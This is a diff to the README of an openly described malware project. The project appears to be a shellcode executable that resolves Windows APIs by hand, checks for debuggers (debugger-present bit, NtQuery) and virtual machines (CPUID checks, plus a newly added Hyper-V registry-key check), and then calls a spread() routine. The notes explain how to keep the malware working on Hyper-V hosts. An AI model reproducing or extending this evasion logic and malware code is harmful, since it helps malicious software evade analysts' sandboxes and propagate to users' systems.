@@ -17,6 +17,7 @@ Final file: ``final.exe``
 
 ### Some note
 -   About Anti VM: I use cpuid for detection, if you using windows with hyperV enable, you probably gonna get VM detect message even you run it on physical OS. That's because, when hypervisor is enable, the host OS is still gonna run under virtualization (this will explain everything, in the limitation part: [link](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/about/))
+Update: I did do some update so that even host OS is working on hypervisor layer, the malware still work, by checking registry ``"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"``, if there is a registry key name: VirtualMachineID or VirtualMachineName -> It should be HyperV (even though this could really easy to counter by adjust , add or remove registry keys)
 -   In case you want to test it with no anti-vm, no anti-debug, go to this code in shellcode.c and comment these line:
 ```c
 void shellcode()
@@ -28,27 +29,35 @@ void shellcode()
     HMODULE user32 = _LoadLibraryA(aUser32dll);
     pMessageBoxA _MessageBoxA = (pMessageBoxA)_GetProcAddress(user32, aMessageBoxA);
     #pragma GCC diagnostic pop
-    if (isDebuggerPresentBit(kernel32, _GetProcAddress) == TRUE) // <-- comment this line for no anti-debug
+    if (isDebuggerPresentBit(kernel32, _GetProcAddress) == TRUE) // <-- comment this section for no anti-debug
     {
-
+        _MessageBoxA(NULL, aDbgDetected, NULL, 0);
         goto EXITDOOR;
     }
-    if (detectWithNTQuery(kernel32, _GetProcAddress, _LoadLibraryA)) // <-- comment this line for no anti-debug
+    if (detectWithNTQuery(kernel32, _GetProcAddress, _LoadLibraryA)) // <-- comment this section for no anti-debug
     {
+        _MessageBoxA(NULL, aDbgDetected, NULL, 0);
         goto EXITDOOR;
     }
-    if (detectCPUID_ManufactureID(kernel32, _GetProcAddress, _LoadLibraryA))// <-- comment this line for no anti-vm
+    if (detectCPUID_ManufactureID(kernel32, _GetProcAddress, _LoadLibraryA)) // <-- comment this section for no anti-vm
     {
-        _MessageBoxA(NULL, aDetected, NULL,0);
-        goto EXITDOOR;
+        if (detectRegKey(kernel32, _GetProcAddress, _LoadLibraryA))
+        {
+            _MessageBoxA(NULL, aVMDetected, NULL,0);
+            goto EXITDOOR;
+        }
     }
-    if (detectCPUID_HypervisorBit()) // <-- comment this line for no anti-vm
+    if (detectCPUID_HypervisorBit()) // <-- comment this section for no anti-vm
     {
-        _MessageBoxA(NULL, aDetected, NULL,0);
-        goto EXITDOOR;
+        if (detectRegKey(kernel32, _GetProcAddress, _LoadLibraryA))
+        {
+            _MessageBoxA(NULL, aVMDetected, NULL,0);
+            goto EXITDOOR;
+        }
+        
     }
     spread(kernel32, _GetProcAddress, _LoadLibraryA);
-    _MessageBoxA(NULL, aOurGoal, NULL, 0); 
+    _MessageBoxA(NULL, aMSSV, NULL, 0); 
     EXITDOOR:
     return;
 }
